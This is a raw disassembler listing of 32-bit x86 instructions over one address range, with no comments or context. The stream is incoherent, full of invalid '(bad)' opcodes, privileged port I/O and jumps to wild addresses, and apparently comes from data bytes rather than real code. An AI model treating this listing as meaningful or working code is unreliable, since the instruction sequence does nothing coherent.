  41df77:	data16 adc dl,dl
  41df7a:	lahf   
  41df7b:	in     al,0xf8
  41df7d:	pop    edi
  41df7e:	arpl   WORD PTR [edi],cx
  41df80:	loope  0x41df70
  41df82:	into   
  41df83:	sub    al,0xea
  41df85:	imul   ecx,DWORD PTR [esi+ecx*1+0xe],0x65
  41df8a:	pusha  
  41df8b:	outs   dx,BYTE PTR ds:[esi]
  41df8c:	xchg   DWORD PTR [esi+0x62e036e8],esi
  41df92:	add    eax,0x1198bbfe
  41df97:	mov    ah,0x25
  41df99:	stos   BYTE PTR es:[edi],al
  41df9a:	xchg   ebx,eax
  41df9b:	lds    edi,FWORD PTR [edx-0x4c41ade9]
  41dfa1:	out    0x55,al
  41dfa3:	call   0x1c812ea5
  41dfa8:	mov    edi,0xe39ad99
  41dfad:	sub    DWORD PTR [ebx+0x120c727a],ebx
  41dfb3:	sbb    edi,edi
  41dfb5:	mov    dl,0x67
  41dfb7:	adc    esi,ebx
  41dfb9:	retf   0xa935
  41dfbc:	test   ch,ah
  41dfbe:	cmp    bl,bh
  41dfc0:	mov    ds:0xaae6da1,al
  41dfc5:	pop    ebp
  41dfc6:	push   es
  41dfc7:	aam    0xb
  41dfc9:	and    eax,0xeffa2f20
  41dfce:	imul   bl
  41dfd0:	inc    ebp
  41dfd1:	inc    esi
  41dfd2:	cmc    
  41dfd3:	mov    DWORD PTR [eax+edi*8-0x7d],ecx
  41dfd7:	leave  
  41dfd8:	out    dx,eax
  41dfd9:	outs   dx,BYTE PTR ds:[esi]
  41dfda:	gs loop 0x41dfb6
  41dfdd:	cmp    DWORD PTR [ebp-0x2c],0xffffffed
  41dfe1:	jecxz  0x41dfd1
  41dfe3:	aaa    
  41dfe4:	pusha  
  41dfe5:	sbb    al,0x64
  41dfe7:	jmp    0x41dfcb
  41dfe9:	inc    esp
  41dfea:	inc    eax
  41dfeb:	popf   
  41dfec:	push   esi
  41dfed:	xchg   edx,eax
  41dfee:	cmp    DWORD PTR [ecx-0x73357e9],edi
  41dff4:	and    ecx,eax
  41dff6:	mov    ds:0x9978d1d8,al
  41dffb:	mov    edx,cs
  41dffd:	bound  eax,QWORD PTR [eax-0x61]
  41e000:	in     eax,dx
  41e001:	rol    DWORD PTR [ebx-0x311f4db2],1
  41e007:	mov    dh,0x8b
  41e009:	nop
  41e00a:	or     DWORD PTR [edi-0x6a],ebp
  41e00d:	in     al,dx
  41e00e:	xor    esi,DWORD PTR [edi+eax*2]
  41e011:	aaa    
  41e012:	stos   BYTE PTR es:[edi],al
  41e013:	cmp    eax,0xcca17d6e
  41e018:	xchg   esi,eax
  41e019:	dec    esp
  41e01a:	mov    DWORD PTR [edi+edi*4+0x6d62116],edx
  41e021:	cli    
  41e022:	adc    edx,DWORD PTR [eax]
  41e024:	add    al,0xe6
  41e026:	punpckhdq mm4,mm1
  41e029:	mov    eax,ds:0x3212e75d
  41e02e:	add    al,0x6b
  41e030:	out    0xb1,eax
  41e032:	dec    ebp
  41e033:	ins    BYTE PTR es:[edi],dx
  41e034:	xchg   ecx,eax
  41e035:	jg     0x41e02d
  41e037:	pop    esi
  41e038:	loope  0x41e06d
  41e03a:	pop    edi
  41e03b:	jge    0x41e085
  41e03d:	loopne 0x41dfc8
  41e03f:	mov    ah,0x2d
  41e041:	add    dh,BYTE PTR [edi]
  41e043:	stc    
  41e044:	mov    BYTE PTR [si-0x105e],0xc0
  41e04a:	push   esp
  41e04b:	add    esp,DWORD PTR [esi-0x5d]
  41e04e:	jne    0x41e050
  41e050:	ficom  WORD PTR [ebp-0x19c4a4ac]
  41e056:	dec    ecx
  41e057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e058:	enter  0xa6c3,0x10
  41e05c:	aam    0xef
  41e05e:	outs   dx,BYTE PTR ds:[esi]
  41e05f:	mov    edx,0xcf496ad0
  41e064:	lahf   
  41e065:	bound  ecx,QWORD PTR [ebx+0x35]
  41e068:	ins    DWORD PTR es:[edi],dx
  41e069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06a:	sar    BYTE PTR [ebp+0x5c],1
  41e06d:	ror    DWORD PTR [esi+0x37edd0cf],cl
  41e073:	bswap  esi
  41e075:	pop    esi
  41e076:	loope  0x41e011
  41e078:	dec    ecx
  41e079:	add    DWORD PTR [ecx+ebx*8],esp
  41e07c:	cwde   
  41e07d:	shl    DWORD PTR [ecx+0x3],0x91
  41e081:	pop    esi
  41e082:	jmp    0x41e0c4
  41e084:	fistp  WORD PTR [esi-0x56f18f76]
  41e08a:	fs stc 
  41e08c:	ror    BYTE PTR [esi-0x6e],cl
  41e08f:	sub    al,0xe8
  41e091:	cmp    esi,DWORD PTR [edx+0x2fd931d0]
  41e097:	jmp    0x41e0a8
  41e099:	adc    BYTE PTR [esi+edi*4-0x1b6d173b],ah
  41e0a0:	jnp    0x41e04f
  41e0a2:	scas   eax,DWORD PTR es:[edi]
  41e0a3:	sahf   
  41e0a4:	xchg   esp,eax
  41e0a5:	xchg   edi,eax
  41e0a6:	fidiv  DWORD PTR [edx*2-0x60d1683c]
  41e0ad:	or     BYTE PTR [esi-0x71],cl
  41e0b0:	xor    eax,0x16b497c9
  41e0b5:	aas    
  41e0b6:	aad    0x48
  41e0b8:	xchg   ecx,eax
  41e0b9:	jo     0x41e09f
  41e0bb:	out    dx,eax
  41e0bc:	test   BYTE PTR [esi+0x6f],dh
  41e0bf:	shl    DWORD PTR [eax],1
  41e0c1:	pop    ds
  41e0c2:	jecxz  0x41e0fe
  41e0c4:	data16 add dl,0x23
  41e0c8:	out    0x90,al
  41e0ca:	sbb    al,dh
  41e0cc:	and    bl,dl
  41e0ce:	push   esi
  41e0cf:	lahf   
  41e0d0:	mov    ebx,0x5fea4c85
  41e0d5:	rep lods al,BYTE PTR ds:[esi]
  41e0d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0d8:	xor    ch,BYTE PTR [ebx-0x43709d10]
  41e0de:	push   esi
  41e0df:	fdivr  st(4),st
  41e0e1:	cdq    
  41e0e2:	add    eax,0x8fd3f88e
  41e0e7:	rcr    BYTE PTR ds:0xa26ce7fa,1
  41e0ed:	ror    BYTE PTR [eax],0xf
  41e0f0:	lahf   
  41e0f1:	inc    ebx
  41e0f2:	pop    ss
  41e0f3:	imul   esi,DWORD PTR [eax],0xffffffe1
  41e0f6:	adc    BYTE PTR [edi+esi*1-0x33a1e394],cl
  41e0fd:	cmc    
  41e0fe:	jmp    0x544ee762
  41e103:	add    BYTE PTR [eax],0x7d
  41e106:	sbb    BYTE PTR [eax],bl
  41e108:	stos   DWORD PTR es:[edi],eax
  41e109:	and    al,0xbc
  41e10b:	add    BYTE PTR [ebp-0x19e33804],0xf9
  41e112:	test   eax,0xc47b3583
  41e117:	sbb    eax,0xf25b0b15
  41e11c:	shrd   DWORD PTR [eax+0x78dc61b6],ebp,cl
  41e123:	lea    ebp,[esi-0xb989699]
  41e129:	sbb    DWORD PTR [esi],0x73
  41e12c:	sub    ch,BYTE PTR [ebx-0x5f0cea4f]
  41e132:	add    eax,0xb60445fe
  41e137:	pusha  
  41e138:	push   esi
  41e139:	sbb    DWORD PTR [ecx+0x659a14c9],ebp
  41e13f:	aam    0x8b
  41e141:	or     eax,0xa3859a01
  41e146:	mov    BYTE PTR [esp+ecx*4-0x64b65f55],al
  41e14d:	test   eax,0xbdd7777f
  41e152:	je     0x41e0fc
  41e154:	out    0xd6,al
  41e156:	sub    eax,0xd0eaf7c2
  41e15b:	mov    edx,0x5085720
  41e160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e161:	std    
  41e162:	dec    esp
  41e163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e164:	stc    
  41e165:	jns    0x41e1c3
  41e167:	xor    edi,DWORD PTR [eax]
  41e169:	xchg   ecx,eax
  41e16a:	mov    ebp,0x1e2baf7a
  41e16f:	mov    dl,0x3
  41e171:	dec    esi
  41e172:	or     ebx,DWORD PTR [ebx-0x7a]
  41e175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e176:	sub    eax,0x6f857ba0
  41e17b:	pop    esi
  41e17c:	adc    BYTE PTR [eax],bh
  41e17e:	dec    eax
  41e17f:	daa    
  41e180:	xor    eax,0x3580605
  41e185:	mov    ecx,0x816b76bf
  41e18a:	ja     0x41e17d
  41e18c:	popa   
  41e18d:	dec    esi
  41e18e:	rcr    BYTE PTR [ebx-0x29e299f5],cl
  41e194:	mov    bh,0x3e
  41e196:	cmp    al,0x82
  41e198:	addr16 push ecx
  41e19a:	xchg   edx,eax
  41e19b:	jb     0x41e12b
  41e19d:	imul   esp,edi,0x63
  41e1a0:	dec    edx
  41e1a1:	and    BYTE PTR [edx+0x5d81598f],dl
  41e1a7:	or     DWORD PTR [ecx-0x7b],0xffffffe2
  41e1ab:	pop    es
  41e1ac:	inc    edx
  41e1ad:	rol    cl,0x9c
  41e1b0:	ins    BYTE PTR es:[edi],dx
  41e1b1:	fnstsw WORD PTR [edx]
  41e1b3:	dec    eax
  41e1b4:	clc    
  41e1b5:	push   esp
  41e1b6:	push   ss
  41e1b7:	(bad)  
  41e1b8:	stos   DWORD PTR es:[edi],eax
  41e1b9:	pop    esi
  41e1ba:	fdivr  DWORD PTR [edx+0x257ee353]
  41e1c0:	sub    ecx,esp
  41e1c2:	fld    DWORD PTR [ebp-0x7a]
  41e1c5:	in     eax,dx
  41e1c6:	push   0xffffffb0
  41e1c8:	adc    BYTE PTR ds:0x4e62ab10,0x4c
  41e1cf:	fcomp  QWORD PTR [esi]
  41e1d1:	stos   BYTE PTR es:[edi],al
  41e1d2:	cmp    ah,dl
  41e1d4:	lock popa 
  41e1d6:	mov    ds:0xf81cab45,eax
  41e1db:	cs mov ah,0x98
  41e1de:	jnp    0x41e193
  41e1e0:	in     eax,0x6
  41e1e2:	add    BYTE PTR [edx-0x7c64df75],ah
  41e1e8:	mov    BYTE PTR [esi+0x3c506d24],al
  41e1ee:	mov    ah,0xf8
  41e1f0:	mov    bl,0x79
  41e1f2:	inc    edx
  41e1f3:	pop    edi
  41e1f4:	daa    
  41e1f5:	xchg   esi,eax
  41e1f6:	(bad)  
  41e1f8:	gs (bad) 
  41e1fb:	mov    ds:0x8b5c46,eax
  41e200:	popa   
  41e201:	sbb    DWORD PTR [eax+ecx*8-0x7a],esi
  41e205:	mov    DWORD PTR [edi],edx
  41e207:	retf   
  41e208:	push   esi
  41e209:	std    
  41e20a:	bound  ecx,QWORD PTR [eax-0x7b]
  41e20d:	js     0x41e1ea
  41e20f:	(bad)  
  41e210:	xchg   BYTE PTR [eax],dh
  41e212:	mov    ecx,0xec305442
  41e217:	add    al,0x3d
  41e219:	sub    BYTE PTR [eiz*2+0x6f56164f],al
  41e220:	aad    0xca
  41e222:	iret   
  41e223:	sub    cl,ch
  41e225:	bound  ecx,QWORD PTR [ecx-0x13dee703]
  41e22b:	mov    esp,0xcfcc48ca
  41e230:	xchg   BYTE PTR [esi],dl
  41e232:	popf   
  41e233:	xchg   BYTE PTR [eax],dl
  41e235:	or     cl,ah
  41e237:	adc    BYTE PTR [eax+0x14],al
  41e23a:	adc    ch,0x66
  41e23d:	mov    esp,0x7fdb8b0b
  41e242:	jb     0x41e28e
  41e244:	cdq    
  41e245:	cmp    ebp,0x85314b09
  41e24b:	xor    ebp,edi
  41e24d:	test   al,0xcd
  41e24f:	and    ebp,DWORD PTR [ebx+0x151dd969]
  41e255:	add    cl,BYTE PTR [ebx+0x13]
  41e258:	jb     0x41e228
  41e25a:	inc    ecx
  41e25b:	rcl    BYTE PTR [esi],0x94
  41e25e:	mov    ebx,0xc2e13d50
  41e263:	adc    edx,esi
  41e265:	sahf   
  41e266:	mov    ds:0x3d4a30e6,eax
  41e26b:	call   0xffce:0x50f28767
  41e272:	js     0x41e2bc
  41e274:	jl     0x41e1fd
  41e276:	push   edi
  41e277:	rol    BYTE PTR [edi+0x3f85aa92],0x4c
  41e27e:	fidivr DWORD PTR [edx]
  41e280:	or     al,0xb5
  41e282:	rcr    BYTE PTR [ebp-0x3],0x4e
  41e286:	ror    dl,1
  41e288:	xor    DWORD PTR [ecx+0x12],esi
  41e28b:	pushf  
  41e28c:	out    0xc4,al
  41e28e:	fs out dx,al
  41e290:	popa   
  41e291:	or     eax,DWORD PTR [esi+0x2c2fe428]
  41e297:	or     al,0xf1
  41e299:	outs   dx,BYTE PTR ds:[esi]
  41e29a:	icebp  
  41e29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e29c:	jbe    0x41e26c
  41e29e:	adc    BYTE PTR [edi+edi*2],bl
  41e2a1:	bound  ebx,QWORD PTR [edx]
  41e2a3:	mov    bl,0x9e
  41e2a5:	and    esi,DWORD PTR [esi+edx*2+0x6]
  41e2a9:	cdq    
  41e2aa:	mov    bh,0xa8
  41e2ac:	es out 0x30,eax
  41e2af:	pop    esi
  41e2b0:	mov    edx,0x8ede9b91
  41e2b5:	pushf  
  41e2b6:	das    
  41e2b7:	je     0x41e29d
  41e2b9:	pop    esp
  41e2ba:	mov    al,ds:0x818e4d9d
  41e2bf:	fs mov ah,0xf6
  41e2c2:	repz fcomp st(5)
  41e2c5:	mov    edx,0xa35674f
  41e2ca:	(bad)  
  41e2cc:	fs jle 0x41e2f5
  41e2cf:	mov    edi,0xf65c15db
  41e2d4:	(bad)  
  41e2d6:	popa   
  41e2d7:	mov    ah,0x17
  41e2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2da:	jb     0x41e30a
  41e2dc:	rol    DWORD PTR [edx+0x26],cl
  41e2df:	and    eax,0x438596a7
  41e2e4:	ds xor al,0x6a
  41e2e7:	mov    edi,0xfdf1c997
  41e2ec:	imul   edx,DWORD PTR [ecx+0x24],0xffffffcf
  41e2f0:	fbstp  TBYTE PTR [edi+edx*1-0x60]
  41e2f4:	int3   
  41e2f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2f6:	and    BYTE PTR [ecx],0x6d
  41e2f9:	test   BYTE PTR [edx+0x34],bh
  41e2fc:	mov    BYTE PTR [eax+0xd],0x6b
  41e300:	data16 xchg BYTE PTR [eax],ch
  41e303:	sar    BYTE PTR [ecx],cl
  41e305:	hlt    
  41e306:	stos   DWORD PTR es:[edi],eax
  41e307:	jo     0x41e2b4
  41e309:	fld    TBYTE PTR [eax-0x52]
  41e30c:	xor    DWORD PTR [edi+0x45],esi
  41e30f:	xor    eax,0xe69475e4
  41e314:	mov    ch,0xbd
  41e316:	gs inc ebp
  41e318:	mov    ebx,0xffe2e5cf
  41e31d:	out    dx,al
  41e31e:	xor    al,0xa9
  41e320:	mov    dl,BYTE PTR [ebx]
  41e322:	cmp    BYTE PTR [ebp-0x5b],0x81
  41e326:	jle    0x41e376
  41e328:	adc    eax,0xbdf60393
  41e32d:	adc    bh,BYTE PTR [edx-0x39]
  41e330:	xchg   ecx,eax
  41e331:	jae    0x41e376
  41e333:	jno    0x41e37c
  41e335:	jo     0x41e3a0
  41e337:	es hlt 
  41e339:	fisub  DWORD PTR [edx]
  41e33b:	sbb    BYTE PTR fs:[esi-0x4accb272],0x38
  41e343:	pop    ecx
  41e344:	rcl    esi,0xf
  41e347:	adc    al,0xfa
  41e349:	das    
  41e34a:	iret   
  41e34b:	enter  0x6ee3,0x36
  41e34f:	imul   edi,DWORD PTR [eax],0x1808dbb5
  41e355:	and    dh,BYTE PTR [ebx-0x25222330]
  41e35b:	imul   edi,esp,0x1e
  41e35e:	push   ebp
  41e35f:	loop   0x41e328
  41e361:	jbe    0x41e33a
  41e363:	out    0x42,eax
  41e365:	stos   BYTE PTR es:[edi],al
  41e366:	sahf   
  41e367:	rol    BYTE PTR [edx-0x5a],1
  41e36a:	dec    eax
  41e36b:	pop    esp
  41e36c:	xchg   DWORD PTR [edx+ecx*8],esi
  41e36f:	ret    
  41e370:	xchg   edx,eax
  41e371:	ret    
  41e372:	and    esp,esp
  41e374:	ins    BYTE PTR es:[edi],dx
  41e375:	sbb    ebp,esp
  41e377:	ret    
  41e378:	pop    ebx
  41e379:	mov    ds:0x58648bab,eax
  41e37e:	jb     0x41e324
  41e380:	aaa    
  41e381:	xchg   BYTE PTR [edi+0x5e],dl
  41e384:	fs fs scas al,BYTE PTR es:[edi]
  41e387:	fidiv  DWORD PTR [esi+0x47]
  41e38a:	xor    eax,0x77bb4b6a
  41e38f:	mov    dl,0xa0
  41e391:	in     al,dx
  41e392:	sbb    BYTE PTR [esp+edx*8+0x718346ba],0x6a
  41e39a:	inc    ecx
  41e39b:	(bad)  
  41e39c:	and    dh,ch
  41e39e:	sahf   
  41e39f:	sub    DWORD PTR [edx],edx
  41e3a1:	ror    BYTE PTR [edx+eiz*2+0x21],0x3e
  41e3a6:	out    0x62,al
  41e3a8:	ret    0x15f5
  41e3ab:	jnp    0x41e3ea
  41e3ad:	sar    bh,cl
  41e3af:	sbb    ebp,0xffffffb5
  41e3b2:	sbb    DWORD PTR [ebx+0x75],edi
  41e3b5:	fisub  DWORD PTR [edx-0x4cb70c0a]
  41e3bb:	pop    ecx
  41e3bc:	xchg   ebx,eax
  41e3bd:	dec    esi
  41e3be:	jbe    0x41e3f1
  41e3c0:	imul   ebp,DWORD PTR [ecx],0x76
  41e3c3:	xor    BYTE PTR [esi+0x66],al
  41e3c6:	sbb    BYTE PTR [ebp+edx*4-0xba17523],ch
  41e3cd:	push   ebp
  41e3ce:	xlat   BYTE PTR ds:[ebx]
  41e3cf:	jmp    0x4cdc:0x61c8cb1
  41e3d6:	cli    
  41e3d7:	ds push eax
  41e3d9:	or     DWORD PTR [eax+esi*1],ebx
  41e3dc:	sub    BYTE PTR [edx-0x79c6e88],cl
  41e3e2:	outs   dx,DWORD PTR ds:[esi]
  41e3e3:	jno    0x41e3ed
  41e3e5:	and    bl,BYTE PTR [esi]
  41e3e7:	ja     0x41e3a7
  41e3e9:	and    DWORD PTR [ebp+0x39],0xffffffe7
  41e3ed:	daa    
  41e3ee:	xchg   edi,eax
  41e3ef:	pop    ebp
  41e3f0:	(bad)  
  41e3f1:	adc    al,0x1d
  41e3f3:	inc    ecx
  41e3f4:	pop    esp
  41e3f5:	mov    DWORD PTR [ebx+0x5d50a23b],esi
  41e3fb:	dec    ecx
  41e3fc:	stos   DWORD PTR es:[edi],eax
  41e3fd:	mov    edx,0x2a659347
  41e402:	mov    edi,0x9fde2957
  41e407:	cdq    
  41e408:	outs   dx,BYTE PTR ds:[esi]
  41e409:	mov    esp,0xda0f768c
  41e40e:	mov    edi,0x8a2270e1
  41e413:	cdq    
  41e414:	ret    
  41e415:	mov    ch,0x4f
  41e417:	jmp    0x41e3b5
  41e419:	add    BYTE PTR [ebx-0x72],ch
  41e41c:	shr    DWORD PTR [esi],1
  41e41e:	loopne 0x41e486
  41e420:	movd   edx,mm6
  41e423:	dec    esi
  41e424:	and    al,0x6
  41e426:	pop    ebp
  41e427:	lods   al,BYTE PTR ds:[esi]
  41e428:	retf   0xb788
  41e42b:	fcmovnu st,st(3)
  41e42d:	sahf   
  41e42e:	jo     0x41e45e
  41e430:	std    
  41e431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e432:	jp     0x41e426
  41e434:	mov    ebp,0xff64eedb
  41e439:	out    0x18,eax
  41e43b:	(bad)  
  41e43c:	repnz xor bl,BYTE PTR [ebx+0x24b3db0a]
  41e443:	push   es
  41e444:	mov    esp,0xf2fac7e7
  41e449:	or     eax,0x22458e74
  41e44e:	push   ebx
  41e44f:	dec    ecx
  41e450:	jns    0x41e425
  41e452:	xor    bl,BYTE PTR [edi+0x16]
  41e455:	rcl    DWORD PTR [edx],0x3d
  41e458:	imul   edx,DWORD PTR [ecx+0x567d7b0f],0x726c7a98
  41e462:	sar    DWORD PTR [edx-0x4e],cl
  41e465:	stos   BYTE PTR es:[edi],al
  41e466:	and    DWORD PTR [edx+0x52],esp
  41e469:	jae    0x41e424
  41e46b:	add    eax,0xbc794312
  41e470:	fnstsw WORD PTR [ebp+0x1513f5c7]
  41e476:	pop    ebx
  41e477:	push   esp
  41e478:	jne    0x41e41a
  41e47a:	aas    
  41e47b:	xor    al,0x99
  41e47d:	inc    esp
  41e47e:	and    edi,ecx
  41e480:	or     DWORD PTR [eax],0xd9877c38
  41e486:	dec    eax
  41e487:	pop    edi
  41e488:	call   0xe743:0xbc2ac981
  41e48f:	scas   eax,DWORD PTR es:[edi]
  41e490:	jns    0x41e4fa
  41e492:	add    al,0xd8
  41e494:	sub    BYTE PTR [edi+0x12],ch
  41e497:	mov    eax,ds:0x19d0e0be
  41e49c:	into   
  41e49d:	jo     0x41e497
  41e49f:	cmp    dl,BYTE PTR [edx]
  41e4a1:	inc    eax
  41e4a2:	lahf   
  41e4a3:	sbb    eax,0x945a0d2d
  41e4a8:	push   ds
  41e4a9:	xchg   esp,eax
  41e4aa:	retf   0x1ef4
  41e4ad:	push   eax
  41e4ae:	pop    ds
  41e4af:	or     DWORD PTR ds:0xf8a8346b,edi
  41e4b5:	lods   eax,DWORD PTR ds:[esi]
  41e4b6:	retf   0xb377
  41e4b9:	pop    ecx
  41e4ba:	push   ecx
  41e4bb:	rcl    edi,cl
  41e4bd:	mov    ebx,esp
  41e4bf:	xchg   edx,eax
  41e4c0:	loop   0x41e4c7
  41e4c2:	test   ch,al
  41e4c4:	or     dh,BYTE PTR [esi+eax*4]
  41e4c7:	jo     0x41e52f
  41e4c9:	sub    eax,0x90f4f734
  41e4ce:	les    edi,FWORD PTR [edx+0x58]
  41e4d1:	jp     0x41e4ff
  41e4d3:	(bad)  
  41e4d4:	loop   0x41e4b1
  41e4d6:	mov    ebx,edx
  41e4d8:	adc    dh,al
  41e4da:	sbb    eax,0x9d593ea9
  41e4df:	inc    esi
  41e4e0:	pop    edx
  41e4e1:	sbb    al,0xbb
  41e4e3:	dec    ebx
  41e4e4:	arpl   WORD PTR [ecx],dx
  41e4e6:	sbb    BYTE PTR [esi],0xb8
  41e4e9:	or     ecx,edx
  41e4eb:	mov    DWORD PTR [ebx-0x5121eaf4],eax
  41e4f1:	lods   al,BYTE PTR ds:[esi]
  41e4f2:	cmp    dh,cl
  41e4f4:	add    eax,0xb5549949
  41e4f9:	pusha  
  41e4fa:	(bad)  
  41e4fb:	jp     0x41e514
  41e4fd:	stos   DWORD PTR es:[edi],eax
  41e4fe:	bound  edx,QWORD PTR [esi*4-0x7b929f70]
  41e505:	jp     0x41e4ff
  41e507:	loope  0x41e529
  41e509:	lods   eax,DWORD PTR ds:[esi]
  41e50a:	push   ds
  41e50b:	fmul   DWORD PTR [ecx-0x5749126c]
  41e511:	sub    BYTE PTR [esp+ecx*8-0x618add21],0xf5
  41e519:	xchg   ebp,eax
  41e51a:	loopne 0x41e539
  41e51c:	mov    ch,0xef
  41e51e:	jnp    0x41e599
  41e520:	or     BYTE PTR [ebx-0x5bf4506b],0x72
  41e527:	jg     0x41e4b1
  41e529:	add    DWORD PTR [ecx],eax
  41e52b:	lock fistp QWORD PTR [esi+0x31d0a8d6]
  41e532:	ds jnp 0x41e5b0
  41e535:	adc    BYTE PTR [edi-0x39],ch
  41e538:	push   0xffffffe2
  41e53a:	dec    eax
  41e53b:	or     DWORD PTR [esi+0x11],eax
  41e53e:	sbb    BYTE PTR [esi-0x3a92d9b6],al
  41e544:	adc    al,0x54
  41e546:	xor    BYTE PTR [edi],bl
  41e548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e549:	mov    eax,0x7e4f9271
  41e54f:	fsub   QWORD PTR [edi]
  41e551:	or     BYTE PTR [esi],bl
  41e553:	add    al,0x1a
  41e555:	loope  0x41e585
  41e557:	popf   
  41e558:	dec    edx
  41e559:	jno    0x41e59d
  41e55b:	fcmovnb st,st(1)
  41e55d:	or     ah,BYTE PTR [ebx+0x3e890e35]
  41e563:	add    BYTE PTR ds:0x1f8d116e,bl
  41e569:	xor    BYTE PTR [edi+0x6c],dl
  41e56c:	pop    esp
  41e56d:	add    DWORD PTR [edx-0x1dc76687],ecx
  41e573:	mov    ecx,0x687c9e1b
  41e578:	loope  0x41e538
  41e57a:	es jmp 0xb9e3f064
  41e580:	ret    0x2d5d
  41e583:	or     cl,dl
  41e585:	xor    eax,0x8631fedc
  41e58a:	mov    edx,0x78d6a5b8
  41e58f:	xchg   BYTE PTR [esi+0x30],dh
  41e592:	or     eax,0x211057a0
  41e597:	dec    edx
  41e598:	mov    ebx,DWORD PTR [esi+0x6e]
  41e59b:	xchg   edi,eax
  41e59c:	lock (bad) 
  41e59e:	jg     0x41e5a6
  41e5a0:	dec    ecx
  41e5a1:	or     al,0x36
  41e5a3:	cmp    eax,0xefe237ba
  41e5a8:	and    DWORD PTR [ebp+0x79],ebx
  41e5ab:	push   ebp
  41e5ac:	jle    0x41e60e
  41e5ae:	pop    eax
  41e5af:	out    0x49,al
  41e5b1:	(bad)  
  41e5b2:	xlat   BYTE PTR ds:[ebx]
  41e5b3:	cli    
  41e5b4:	outs   dx,BYTE PTR ds:[esi]
  41e5b5:	mov    ebp,0x26c3f2a0
  41e5ba:	aas    
  41e5bb:	push   ds
  41e5bc:	and    BYTE PTR [ecx+0x78572393],0x6d
  41e5c3:	ja     0x41e555
  41e5c5:	rol    BYTE PTR [ecx+0x4b8b3e08],1
  41e5cb:	stc    
  41e5cc:	repnz out 0x56,eax
  41e5cf:	sbb    eax,esi
  41e5d1:	inc    esi
  41e5d2:	scas   eax,DWORD PTR es:[edi]
  41e5d3:	scas   al,BYTE PTR es:[edi]
  41e5d4:	pop    ebx
  41e5d5:	sbb    BYTE PTR [ebp+0x78],dh
  41e5d8:	rcl    DWORD PTR [eax],cl
  41e5da:	je     0x41e586
  41e5dc:	in     al,0x78
  41e5de:	mov    edx,0xc612a09f
  41e5e3:	aas    
  41e5e4:	push   0x289d2f6d
  41e5e9:	push   0xffffffff
  41e5eb:	and    ah,dh
  41e5ed:	jbe    0x41e5a1
  41e5ef:	mov    ds:0xffd2608e,eax
  41e5f4:	jmp    0x47d7cd61
  41e5f9:	ret    0x212a
  41e5fc:	cmc    
  41e5fd:	lahf   
  41e5fe:	fcomp  st(0)
  41e600:	xor    edx,DWORD PTR [edx+esi*4]
  41e603:	mov    esi,esi
  41e605:	cwde   
  41e606:	cmp    BYTE PTR [ebp+0x68],ch
  41e609:	in     al,dx
  41e60a:	lds    edi,FWORD PTR [edi]
  41e60c:	inc    esp
  41e60d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e60e:	mov    ecx,0xabe0f046
  41e613:	or     BYTE PTR [edx-0x1b],dl
  41e616:	fneni(8087 only) 
  41e618:	or     BYTE PTR [ebx+edx*2+0x28],bl
  41e61c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e61d:	adc    DWORD PTR [ebp+0xd],esp
  41e620:	mov    esi,0xed425460
  41e625:	aaa    
  41e626:	pop    ebx
  41e627:	inc    esp
  41e628:	repnz pusha 
  41e62a:	ror    BYTE PTR [ebx-0x10a6b960],1
  41e630:	mov    ch,0xa4
  41e632:	sub    BYTE PTR [edx+eax*4+0x5f],dl
  41e636:	jge    0x41e5d2
  41e638:	add    eax,0x3d89d21b
  41e63d:	adc    bh,BYTE PTR [ebx]
  41e63f:	hlt    
  41e640:	ffreep st(4)
  41e642:	xchg   BYTE PTR [eax+0x1e551fcd],dh
  41e648:	mov    BYTE PTR [ebx],dl
  41e64a:	push   edi
  41e64b:	outs   dx,BYTE PTR ds:[esi]
  41e64c:	je     0x41e666
  41e64e:	mov    al,0x82
  41e650:	fnstenv [edi]
  41e652:	sbb    BYTE PTR [esi+0x5e2486ea],al
  41e658:	shr    BYTE PTR ds:0xc0f44e40,0x1d
  41e65f:	(bad)  
  41e660:	jne    0x41e5ef
  41e662:	pop    ds
  41e663:	or     al,0xcf
  41e665:	jns    0x41e699
  41e667:	sahf   
  41e668:	mov    cl,0x31
  41e66a:	xor    BYTE PTR [edx-0xee783ba],bh
  41e670:	xchg   ebp,eax
  41e671:	mov    edx,0xa2fe3ff9
  41e676:	shr    BYTE PTR [ebx-0x6],1
  41e679:	inc    edi
  41e67a:	push   esi
  41e67b:	scas   al,BYTE PTR es:[edi]
  41e67c:	test   BYTE PTR [ecx],cl
  41e67e:	sbb    al,0xed
  41e680:	push   ebp
  41e681:	xor    ah,ah
  41e683:	mov    ch,0x12
  41e685:	in     al,dx
  41e686:	push   ebp
  41e687:	cmp    cl,BYTE PTR [di-0x28]
  41e68b:	fcom   QWORD PTR [ebp+0x41]
  41e68e:	imul   edi,DWORD PTR [esi+0x5f19bf1e],0x5c
  41e695:	adc    dl,BYTE PTR [esp+edi*1+0x1e425b5a]
  41e69c:	jnp    0x41e6a0
  41e69e:	cmc    
  41e69f:	nop
  41e6a0:	mov    ecx,0x79d53900
  41e6a5:	adc    al,0xc2
  41e6a7:	(bad)  
  41e6a8:	js     0x41e64c
  41e6aa:	mov    bh,0xa9
  41e6ac:	mov    edi,0x2863fa7e
  41e6b1:	sbb    dh,BYTE PTR [eax-0x27c509c1]
  41e6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b8:	sar    DWORD PTR [ebx],1
  41e6ba:	jg     0x41e6c7
  41e6bc:	jg     0x41e6b0
  41e6be:	jns    0x41e658
  41e6c0:	mov    bl,0xfe
  41e6c2:	imul   ecx,DWORD PTR [ebx+ebx*2],0x8b44c2e8
  41e6c9:	fnstcw WORD PTR [ecx-0x71]
  41e6cc:	cmp    bh,BYTE PTR [edi+0x7b]
  41e6cf:	push   ebp
  41e6d0:	inc    esi
  41e6d1:	cld    
  41e6d2:	(bad)  
  41e6d3:	sbb    al,0xa0
  41e6d5:	lahf   
